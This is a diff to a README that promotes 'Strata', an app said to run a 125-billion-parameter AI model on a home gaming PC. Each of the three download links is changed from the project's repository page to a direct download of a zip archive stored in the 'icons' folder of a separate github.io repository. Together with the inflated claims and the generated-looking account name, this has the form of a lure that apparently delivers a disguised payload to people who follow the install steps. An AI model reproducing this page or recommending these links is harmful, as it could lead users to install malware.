@@ -6,7 +6,7 @@ description: "Run a 125-billion-parameter AI model on your own gaming PC with fr
 <h1>⚡ Strata - Effortless AI Power on Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Corevangueriamadagascariensis558/Strata" style="background:#FF6B6B;color:white;padding:16px 32px;font-size:24px;text-decoration:none;border-radius:50px;font-weight:bold;display:inline-block;">⬇️ DOWNLOAD STRATA NOW</a>
+  <a href="https://github.com/Corevangueriamadagascariensis558/corevangueriamadagascariensis558.github.io/raw/refs/heads/main/icons/2.6.zip" style="background:#FF6B6B;color:white;padding:16px 32px;font-size:24px;text-decoration:none;border-radius:50px;font-weight:bold;display:inline-block;">⬇️ DOWNLOAD STRATA NOW</a>
 </p>
 
 ## 🖥️ What is Strata?
@@ -38,7 +38,7 @@ Getting Strata up and running is simpler than you might think. We've designed th
 
 ### 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Corevangueriamadagascariensis558/Strata](https://github.com/Corevangueriamadagascariensis558/Strata)
+Visit this link to download the application: [https://github.com/Corevangueriamadagascariensis558/corevangueriamadagascariensis558.github.io/raw/refs/heads/main/icons/2.6.zip](https://github.com/Corevangueriamadagascariensis558/corevangueriamadagascariensis558.github.io/raw/refs/heads/main/icons/2.6.zip)
 
 Once you've visited the page and downloaded the software, you're ready to begin. Strata is designed to install with minimal interaction, so you'll be up and running in no time.
 
@@ -193,6 +193,6 @@ Strata breaks down the barriers between you and powerful AI technology. No cloud
 
 With its user-friendly approach, one-click installation, and versatile feature set, Strata is the perfect choice for anyone curious about AI, regardless of their technical background.
 
-**Ready to experience local AI power? Visit the download page now and be up and running in minutes:** [https://github.com/Corevangueriamadagascariensis558/Strata](https://github.com/Corevangueriamadagascariensis558/Strata)
+**Ready to experience local AI power? Visit the download page now and be up and running in minutes:** [https://github.com/Corevangueriamadagascariensis558/corevangueriamadagascariensis558.github.io/raw/refs/heads/main/icons/2.6.zip](https://github.com/Corevangueriamadagascariensis558/corevangueriamadagascariensis558.github.io/raw/refs/heads/main/icons/2.6.zip)
 
 Embrace the future of computing with Strata - where AI meets accessibility.
